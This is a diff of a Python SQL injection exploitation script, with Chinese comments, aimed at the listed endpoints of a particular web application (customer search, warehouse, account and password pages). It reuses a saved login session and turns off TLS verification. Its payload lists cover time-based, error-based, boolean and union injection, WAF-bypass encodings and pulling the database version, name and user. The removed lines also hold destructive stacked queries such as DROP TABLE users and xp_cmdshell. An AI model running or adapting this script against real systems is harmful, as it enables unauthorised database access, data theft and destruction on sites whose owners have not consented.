@@ -3,8 +3,8 @@
 import requests
 import time
 import json
-from urllib.parse import urljoin, quote, quote_plus
-from concurrent.futures import ThreadPoolExecutor, as_completed
+from urllib.parse import quote, urlencode
+from concurrent.futures import ThreadPoolExecutor
 import urllib3
 urllib3.disable_warnings()
 
@@ -15,7 +15,7 @@ class SQLiExploit:
         self.session.verify = False
         self.load_session()
         self.vulnerabilities = []
-        self.confirmed_sqli = []
+        self.db_info = {}
         
     def load_session(self):
         try:
@@ -25,299 +25,359 @@ class SQLiExploit:
         except:
             pass
     
-    # 时间盲注Payload
-    TIME_BASED_PAYLOADS = [
-        "' AND SLEEP(5)--",
-        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
-        "'; WAITFOR DELAY '00:00:05'--",
-        "'; EXEC xp_cmdshell('ping -n 5 127.0.0.1')--",
-        "' OR SLEEP(5)--",
-        "1' AND SLEEP(5) AND '1'='1",
-        "1' AND (SELECT COUNT(*) FROM sysobjects)>0 AND SLEEP(5)--",
-        "1'; SELECT SLEEP(5);--",
-        "1' UNION SELECT SLEEP(5),NULL,NULL--",
-        "admin' AND SLEEP(5)--",
-        "' OR 1=1 AND SLEEP(5)--",
-        "') OR SLEEP(5)--",
-        "') OR (SELECT SLEEP(5))--",
-        "1' OR SLEEP(5) OR '1'='1",
-    ]
-    
-    # 错误注入Payload
-    ERROR_BASED_PAYLOADS = [
-        "' OR 1=1--",
-        "' OR '1'='1",
-        "' OR 1=1#",
-        "admin'--",
-        "admin'/*",
-        "1' UNION SELECT NULL--",
-        "1' UNION SELECT NULL,NULL--",
-        "1' UNION SELECT NULL,NULL,NULL--",
-        "' UNION SELECT 1,2,3--",
-        "' UNION SELECT version(),user(),database()--",
-        "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
-        "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
-        "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(0x7e,version(),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
-        "' OR 1=1 LIMIT 1--",
-        "1' OR 1=1 LIMIT 1--",
-        "' OR 1=1 LIMIT 1 OFFSET 0--",
-        "1' AND 1=2 UNION SELECT NULL,NULL--",
-        "' AND 1=2 UNION SELECT 1,2,3--",
-        "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
-        "' OR SLEEP(1) OR '1'='1",
-        "1' OR SLEEP(1) OR '1'='1",
-    ]
-    
-    # 布尔盲注Payload
-    BOOLEAN_PAYLOADS = [
-        "' AND 1=1--",
-        "' AND 1=2--",
-        "' AND 'a'='a",
-        "' AND 'a'='b",
-        "1' AND 1=1--",
-        "1' AND 1=2--",
-        "' OR 1=1--",
-        "' OR 1=2--",
-        "admin' AND '1'='1",
-        "admin' AND '1'='2",
-        "' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
-        "' AND (SELECT SUBSTRING(@@version,1,1))='M'--",
-        "1' AND ASCII(SUBSTRING((SELECT version()),1,1))>50--",
-        "1' AND ASCII(SUBSTRING((SELECT version()),1,1))<50--",
-    ]
-    
-    # 堆叠注入Payload
-    STACKED_PAYLOADS = [
-        "'; DROP TABLE users--",
-        "'; DELETE FROM users--",
-        "'; INSERT INTO users VALUES('admin','password')--",
-        "'; UPDATE users SET password='hacked' WHERE username='admin'--",
-        "1'; EXEC xp_cmdshell('whoami');--",
-        "'; EXEC('SELECT 1');--",
-    ]
-    
-    def test_time_based(self, url, param_name, param_value):
+    def time_based_test(self, url, param_name, payload):
         """时间盲注测试"""
-        base_time = time.time()
         try:
-            r = self.session.get(url, timeout=8, params={param_name: param_value})
-            elapsed = time.time() - base_time
-            return elapsed
+            start = time.time()
+            r = self.session.get(url, timeout=15)
+            elapsed = time.time() - start
+            
+            # 测试延迟payload
+            test_url = f"{url}&{param_name}={quote(payload)}" if '?' in url else f"{url}?{param_name}={quote(payload)}"
+            start = time.time()
+            r2 = self.session.get(test_url, timeout=15)
+            elapsed2 = time.time() - start
+            
+            if elapsed2 - elapsed > 4:
+                return True, elapsed2
         except:
-            return 0
+            pass
+        return False, 0
     
-    def test_error_based(self, url, param_name, param_value):
-        """错误注入测试"""
+    def error_based_test(self, url, param_name, payload):
+        """报错注入测试"""
         try:
-            r = self.session.get(url, timeout=5, params={param_name: param_value})
-            content_lower = r.text.lower()
+            test_url = f"{url}&{param_name}={quote(payload)}" if '?' in url else f"{url}?{param_name}={quote(payload)}"
+            r = self.session.get(test_url, timeout=10)
             
             error_indicators = [
                 'sql syntax', 'mysql', 'postgresql', 'oracle',
                 'microsoft ole db', 'odbc', 'sqlserver',
                 'warning:', 'error in your sql',
                 'quoted string', 'unclosed quotation',
-                'mysql_fetch', 'mysql_num_rows',
-                'ora-', 'oracle error',
-                'postgresql error', 'pg_query',
-                'sqlite error', 'sqlite3',
-                'warning: pg_', 'valid mysql result',
-                'nzal', 'odbc sql server driver',
-                'sql server driver', 'sqlcommand',
-                'sqlite_exception', 'sqlstate',
-                'syntax error', 'unexpected end',
-                'sql error', 'sql exception',
+                'sqlstate', 'exception', 'invalid query',
+                'syntax error', 'parse error',
+                'conversion failed', 'type mismatch',
+                'invalid column', 'table doesn\'t exist',
+                'column doesn\'t exist', 'unknown column'
             ]
             
+            content_lower = r.text.lower()
             for indicator in error_indicators:
                 if indicator in content_lower:
-                    return True, indicator
-            return False, None
+                    return True, r.text[:500]
         except:
-            return False, None
+            pass
+        return False, None
     
-    def test_boolean_based(self, url, param_name, true_payload, false_payload):
+    def boolean_based_test(self, url, param_name):
         """布尔盲注测试"""
         try:
-            r1 = self.session.get(url, timeout=5, params={param_name: true_payload})
-            r2 = self.session.get(url, timeout=5, params={param_name: false_payload})
+            # True条件
+            true_payload = "1' OR '1'='1"
+            true_url = f"{url}&{param_name}={quote(true_payload)}" if '?' in url else f"{url}?{param_name}={quote(true_payload)}"
+            r_true = self.session.get(true_url, timeout=10)
             
-            if len(r1.content) != len(r2.content):
+            # False条件
+            false_payload = "1' AND '1'='2"
+            false_url = f"{url}&{param_name}={quote(false_payload)}" if '?' in url else f"{url}?{param_name}={quote(false_payload)}"
+            r_false = self.session.get(false_url, timeout=10)
+            
+            if len(r_true.content) != len(r_false.content):
                 return True
-            if r1.status_code != r2.status_code:
-                return True
-            return False
         except:
-            return False
+            pass
+        return False
     
-    def test_endpoint_sqli(self, endpoint, method='GET'):
-        """测试端点SQL注入"""
-        print(f"[*] 测试: {endpoint}")
-        
-        # 参数名猜测
-        param_names = [
-            'id', 'ID', 'Id', 'user_id', 'userID', 'userId',
-            'name', 'Name', 'username', 'UserName', 'userName',
-            'email', 'Email', 'mobile', 'Mobile', 'mobileNumber',
-            'q', 'query', 'Query', 'search', 'Search', 'keyword',
-            'page', 'Page', 'limit', 'Limit', 'offset', 'Offset',
-            'type', 'Type', 'sort', 'Sort', 'order', 'Order',
-            'districtID', 'DistrictID', 'provinceID', 'ProvinceID',
-            'warehouseID', 'WareHouseID', 'wareHouseID',
-            'groupPermissionID', 'GroupPermissionID',
-            'customerID', 'CustomerID', 'customer_id',
+    def union_based_test(self, url, param_name):
+        """Union注入测试"""
+        union_payloads = [
+            "1' UNION SELECT NULL--",
+            "1' UNION SELECT NULL,NULL--",
+            "1' UNION SELECT NULL,NULL,NULL--",
+            "1' UNION SELECT NULL,NULL,NULL,NULL--",
+            "1' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
+            "1' UNION SELECT 1--",
+            "1' UNION SELECT 1,2--",
+            "1' UNION SELECT 1,2,3--",
+            "1' UNION SELECT 1,2,3,4--",
+            "1' UNION SELECT 1,2,3,4,5--",
         ]
         
-        results = []
+        for payload in union_payloads:
+            try:
+                test_url = f"{url}&{param_name}={quote(payload)}" if '?' in url else f"{url}?{param_name}={quote(payload)}"
+                r = self.session.get(test_url, timeout=10)
+                
+                if r.status_code == 200 and 'union' not in r.text.lower():
+                    return True, payload
+            except:
+                pass
+        return False, None
+    
+    def test_endpoint_sqli(self, endpoint, params=None):
+        """测试单个端点SQL注入"""
+        print(f"[*] 测试: {endpoint}")
         
-        # 解析端点
+        url = f"{self.base_url}{endpoint}"
+        if params:
+            url += "?" + urlencode(params)
+        
+        # 提取参数名
+        param_names = []
         if '?' in endpoint:
-            base_url_part = endpoint.split('?')[0]
-            existing_param = endpoint.split('?')[1].split('=')[0]
-            param_names.insert(0, existing_param)
-        else:
-            base_url_part = endpoint
+            query = endpoint.split('?')[1].split('&')[0]
+            if '=' in query:
+                param_names.append(query.split('=')[0])
+        if params:
+            param_names.extend(params.keys())
         
-        url = urljoin(self.base_url, base_url_part)
+        if not param_names:
+            param_names = ['id', 'q', 'search', 'keyword', 'name', 'user', 'user_id']
         
-        for param_name in param_names[:10]:  # 测试前10个参数
-            # 时间盲注测试
-            for payload in self.TIME_BASED_PAYLOADS[:5]:  # 前5个
-                elapsed = self.test_time_based(url, param_name, payload)
-                if elapsed >= 4.5:  # 延迟超过4.5秒
-                    print(f"[!] 时间盲注: {url}?{param_name}={payload[:30]}... (延迟: {elapsed:.2f}s)")
-                    results.append({
-                        'type': 'Time-based SQL Injection',
-                        'url': f"{url}?{param_name}={payload}",
-                        'param': param_name,
-                        'payload': payload,
-                        'delay': elapsed
-                    })
-                    self.confirmed_sqli.append({
-                        'endpoint': endpoint,
-                        'param': param_name,
-                        'payload': payload,
-                        'type': 'time-based'
-                    })
-                    break
+        results = {}
+        
+        for param_name in param_names:
+            print(f"  [*] 参数: {param_name}")
             
-            # 错误注入测试
-            for payload in self.ERROR_BASED_PAYLOADS[:10]:  # 前10个
-                is_vuln, indicator = self.test_error_based(url, param_name, payload)
+            # 时间盲注payload
+            time_payloads = [
+                "1' AND SLEEP(5)--",
+                "1' AND SLEEP(10)--",
+                "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+                "1' AND (SELECT * FROM (SELECT(SLEEP(10)))a)--",
+                "1'; WAITFOR DELAY '00:00:05'--",
+                "1' AND pg_sleep(5)--",
+                "1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE SLEEP(5))--",
+            ]
+            
+            # 报错注入payload
+            error_payloads = [
+                "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
+                "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+                "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+                "1' AND updatexml(1, CONCAT(0x7e, (SELECT version()), 0x7e), 1)--",
+                "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(user(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+                "1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--",
+            ]
+            
+            # 测试时间盲注
+            for payload in time_payloads[:3]:
+                is_vuln, delay = self.time_based_test(url, param_name, payload)
                 if is_vuln:
-                    print(f"[!] 错误注入: {url}?{param_name}={payload[:30]}... (错误: {indicator})")
-                    results.append({
-                        'type': 'Error-based SQL Injection',
-                        'url': f"{url}?{param_name}={payload}",
-                        'param': param_name,
+                    print(f"    [!] 时间盲注: {delay:.2f}s")
+                    results[f'{param_name}_time'] = {
+                        'type': 'Time-based SQL Injection',
                         'payload': payload,
-                        'error': indicator
-                    })
-                    self.confirmed_sqli.append({
+                        'delay': delay
+                    }
+                    self.vulnerabilities.append({
                         'endpoint': endpoint,
                         'param': param_name,
+                        'type': 'Time-based SQL Injection',
                         'payload': payload,
-                        'type': 'error-based'
+                        'delay': delay
                     })
                     break
             
-            # 布尔盲注测试
-            true_payload = "' AND 1=1--"
-            false_payload = "' AND 1=2--"
-            if self.test_boolean_based(url, param_name, true_payload, false_payload):
-                print(f"[!] 布尔盲注: {url}?{param_name}=...")
-                results.append({
-                    'type': 'Boolean-based SQL Injection',
-                    'url': f"{url}?{param_name}={true_payload}",
-                    'param': param_name,
-                    'payload': true_payload
-                })
-                self.confirmed_sqli.append({
+            # 测试报错注入
+            for payload in error_payloads[:3]:
+                is_vuln, error_msg = self.error_based_test(url, param_name, payload)
+                if is_vuln:
+                    print(f"    [!] 报错注入")
+                    print(f"        错误信息: {error_msg[:200]}")
+                    results[f'{param_name}_error'] = {
+                        'type': 'Error-based SQL Injection',
+                        'payload': payload,
+                        'error': error_msg[:500]
+                    }
+                    self.vulnerabilities.append({
+                        'endpoint': endpoint,
+                        'param': param_name,
+                        'type': 'Error-based SQL Injection',
+                        'payload': payload,
+                        'error': error_msg[:500]
+                    })
+                    break
+            
+            # 测试布尔盲注
+            if self.boolean_based_test(url, param_name):
+                print(f"    [!] 布尔盲注")
+                results[f'{param_name}_boolean'] = {
+                    'type': 'Boolean-based SQL Injection'
+                }
+                self.vulnerabilities.append({
                     'endpoint': endpoint,
                     'param': param_name,
-                    'payload': true_payload,
-                    'type': 'boolean-based'
+                    'type': 'Boolean-based SQL Injection'
+                })
+            
+            # 测试Union注入
+            is_union, payload = self.union_based_test(url, param_name)
+            if is_union:
+                print(f"    [!] Union注入")
+                results[f'{param_name}_union'] = {
+                    'type': 'Union-based SQL Injection',
+                    'payload': payload
+                }
+                self.vulnerabilities.append({
+                    'endpoint': endpoint,
+                    'param': param_name,
+                    'type': 'Union-based SQL Injection',
+                    'payload': payload
                 })
         
         return results
     
+    def extract_db_info(self, endpoint, param_name):
+        """提取数据库信息"""
+        print(f"[*] 提取数据库信息: {endpoint}")
+        
+        url = f"{self.base_url}{endpoint}"
+        
+        # 提取版本
+        version_payloads = [
+            "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
+            "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+            "1' UNION SELECT NULL,NULL,version(),NULL--",
+        ]
+        
+        # 提取数据库名
+        db_payloads = [
+            "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()), 0x7e))--",
+            "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+            "1' UNION SELECT NULL,NULL,database(),NULL--",
+        ]
+        
+        # 提取用户
+        user_payloads = [
+            "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT user()), 0x7e))--",
+            "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(user(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+            "1' UNION SELECT NULL,NULL,user(),NULL--",
+        ]
+        
+        for payload in version_payloads:
+            test_url = f"{url}?{param_name}={quote(payload)}"
+            try:
+                r = self.session.get(test_url, timeout=10)
+                if 'version' in r.text.lower() or 'microsoft' in r.text.lower() or 'mysql' in r.text.lower():
+                    # 提取版本号
+                    import re
+                    version_match = re.search(r'(\d+\.\d+\.\d+)', r.text)
+                    if version_match:
+                        self.db_info['version'] = version_match.group(1)
+                        print(f"    [+] 数据库版本: {self.db_info['version']}")
+                        break
+            except:
+                pass
+    
     def test_all_endpoints(self):
         """测试所有端点"""
         endpoints = [
-            "/Handle/SearchListCustomer",
-            "/Handle/SearchListProvince",
-            "/Handle/SearchListWardByDistrictID?DistrictID=",
-            "/Handle/SearchListDistrictByProvinceID?ProvinceID=",
-            "/Handle/SearchListWareHouse",
-            "/Handle/SearchListProductVariantByWareHouseID?WareHouseID=",
-            "/Handle/SearchListFunctionalByGroupPermissionID?GroupPermissionID=",
-            "/Handle/SearchPWDByVNPMapsSearch",
-            "/Handle/SearchPWDByEMSMapsSearch",
-            "/Handle/SearchPWDByVMapCode",
-            "/Account/GetUserInfo",
-            "/Account/JLogin",
+            ("/Handle/SearchListCustomer", {"q": "test", "search": "test", "keyword": "test"}),
+            ("/Handle/SearchListProvince", {"Type": "test"}),
+            ("/Handle/SearchListWardByDistrictID", {"DistrictID": "1"}),
+            ("/Handle/SearchListDistrictByProvinceID", {"ProvinceID": "1"}),
+            ("/Handle/SearchListWareHouse", {}),
+            ("/Handle/SearchListProductVariantByWareHouseID", {"WareHouseID": "1"}),
+            ("/Handle/SearchListFunctionalByGroupPermissionID", {"GroupPermissionID": "1"}),
+            ("/Handle/SearchPWDByVNPMapsSearch", {"q": "test"}),
+            ("/Handle/SearchPWDByEMSMapsSearch", {"q": "test"}),
+            ("/Handle/SearchPWDByVMapCode", {"code": "test"}),
+            ("/Handle/VNPMapsAutocomplete", {"q": "test"}),
+            ("/Account/GetUserInfo", {"id": "1", "ID": "1", "Id": "1"}),
+            ("/Account/ChangePassword", {}),
+            ("/Account/Profile", {}),
         ]
         
-        all_results = []
-        for endpoint in endpoints:
-            results = self.test_endpoint_sqli(endpoint)
-            all_results.extend(results)
-            time.sleep(0.5)  # 避免请求过快
-        
-        return all_results
+        for endpoint, params in endpoints:
+            try:
+                self.test_endpoint_sqli(endpoint, params)
+                time.sleep(1)  # 避免请求过快
+            except Exception as e:
+                print(f"[-] Error testing {endpoint}: {e}")
     
-    def exploit_confirmed(self):
-        """利用已确认的SQL注入"""
-        print("\n[*] 利用已确认的SQL注入...")
+    def waf_bypass_test(self, endpoint, param_name):
+        """WAF绕过测试"""
+        print(f"[*] WAF绕过测试: {endpoint}")
         
-        exploit_payloads = [
-            ("数据库名", "1' UNION SELECT database(),NULL--"),
-            ("版本", "1' UNION SELECT version(),NULL--"),
-            ("用户", "1' UNION SELECT user(),NULL--"),
-            ("表名", "1' UNION SELECT table_name,NULL FROM information_schema.tables LIMIT 1--"),
-            ("列名", "1' UNION SELECT column_name,NULL FROM information_schema.columns LIMIT 1--"),
+        url = f"{self.base_url}{endpoint}"
+        
+        # 绕过技术
+        bypass_payloads = [
+            # 注释绕过
+            "1'/**/OR/**/'1'='1",
+            "1'/*comment*/OR/*comment*/'1'='1",
+            "1'--%0AOR--%0A'1'='1",
+            "1'#%0AOR#%0A'1'='1",
+            
+            # 大小写绕过
+            "1' Or '1'='1",
+            "1' OR '1'='1",
+            "1' oR '1'='1",
+            "1' oR '1'='1",
+            
+            # 编码绕过
+            "1%27%20OR%20%271%27%3D%271",
+            "1'%20OR%20'1'='1",
+            "%31%27%20%4F%52%20%27%31%27%3D%27%31",
+            
+            # 双重编码
+            "%31%2527%2520%254F%2552%2520%2527%2531%2527%253D%2527%2531",
+            
+            # 空格绕过
+            "1'/**/OR/**/'1'='1",
+            "1'%09OR%09'1'='1",
+            "1'%0AOR%0A'1'='1",
+            "1'%0DOR%0D'1'='1",
+            "1'%0COR%0C'1'='1",
+            "1'%0BOR%0B'1'='1",
+            
+            # 函数绕过
+            "1' OR CHAR(49)=CHAR(49)",
+            "1' OR ASCII('1')=49",
+            "1' OR UNICODE('1')=49",
+            
+            # 时间盲注绕过
+            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+            "1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE SLEEP(5))--",
         ]
         
-        for sqli in self.confirmed_sqli[:3]:  # 利用前3个
-            endpoint = sqli['endpoint']
-            param = sqli['param']
-            
-            if '?' in endpoint:
-                base_url = endpoint.split('?')[0]
-            else:
-                base_url = endpoint
-            
-            url = urljoin(self.base_url, base_url)
-            
-            print(f"\n[+] 利用: {endpoint} (参数: {param})")
-            for name, payload in exploit_payloads:
-                try:
-                    test_url = f"{url}?{param}={quote(payload)}"
-                    r = self.session.get(test_url, timeout=10)
-                    if r.status_code == 200 and len(r.content) > 10:
-                        print(f"    {name}: {r.text[:200]}")
-                except:
-                    pass
+        for payload in bypass_payloads:
+            test_url = f"{url}?{param_name}={payload}"
+            try:
+                start = time.time()
+                r = self.session.get(test_url, timeout=15)
+                elapsed = time.time() - start
+                
+                if elapsed > 4:
+                    print(f"    [!] WAF绕过成功: {payload[:50]}")
+                    return True, payload
+            except:
+                pass
+        
+        return False, None
+    
+    def save_results(self):
+        """保存结果"""
+        with open('sqli_results.json', 'w', encoding='utf-8') as f:
+            json.dump({
+                'vulnerabilities': self.vulnerabilities,
+                'db_info': self.db_info
+            }, f, indent=2, ensure_ascii=False)
+        
+        print(f"\n[+] 发现 {len(self.vulnerabilities)} 个SQL注入漏洞")
+        if self.vulnerabilities:
+            print("\n漏洞列表:")
+            for vuln in self.vulnerabilities:
+                print(f"  - {vuln['endpoint']} [{vuln['param']}] - {vuln['type']}")
     
     def run_all(self):
         """执行所有测试"""
         print("[*] 开始SQL注入深度测试...\n")
-        
-        results = self.test_all_endpoints()
-        
-        if self.confirmed_sqli:
-            self.exploit_confirmed()
-        
-        # 保存结果
-        with open('sqli_results.json', 'w', encoding='utf-8') as f:
-            json.dump({
-                'vulnerabilities': results,
-                'confirmed': self.confirmed_sqli
-            }, f, indent=2, ensure_ascii=False)
-        
-        print(f"\n[+] 发现 {len(results)} 个SQL注入漏洞")
-        print(f"[+] 确认 {len(self.confirmed_sqli)} 个可利用")
+        self.test_all_endpoints()
+        self.save_results()
 
 if __name__ == "__main__":
-    exploiter = SQLiExploit()
-    exploiter.run_all()
+    sqli = SQLiExploit()
+    sqli.run_all()
